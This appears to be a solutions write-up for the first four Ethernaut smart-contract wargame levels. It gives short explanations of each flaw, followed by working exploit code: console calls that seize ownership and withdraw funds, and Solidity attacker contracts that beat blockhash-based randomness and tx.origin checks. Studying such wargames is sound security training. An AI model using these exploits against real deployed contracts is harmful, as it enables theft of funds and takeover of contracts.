# Ethernaut solution

## 1. Fallback
Abusing erroneous logic between the functions and fallback function
```
await contract.contribute({value: 1234});
await contract.sendTransaction({value: 1234});
await contract.withdraw();
```

## 2. Fallout
Constructor is spelled wrongly; becomes a regular function
```
await contract.Fal1out({value: 1234});
await contract.sendAllocation(await contract.owner());
```

## 3. Coinflip
Don't rely on block number for any validation logic. I can calculate solution if both our txn in the same block and pass the result to your contract!
``` 
pragma solidity ^0.4.24;
import "./CoinFlip.sol";

contract CoinFlipSoln {
    CoinFlip private _victim;
    uint256 private lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _address) public {
        _victim = CoinFlip(_address);
    }
    
    function hackIt() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    _victim.flip(side);

  }
}
```

## 4. Telephone
Don't rely on tx.origin. Remember that when you call a contract (B) function from within another contract (A), the msg.sender is the address of A, not the account that you initiated the function from. The only way you can preserve msg.sender is through DelegateCall but that's another shit show by itself! Would avoid unless you know what you're doing.
```
pragma solidity ^0.4.24;
import "./telephone.sol";

contract HackIt {
    Telephone private telephone;
    
    constructor(address _address) public {
        telephone = Telephone(_address);
    }
    
    function hackIt() public {
        telephone.changeOwner(msg.sender);
    }
}
```







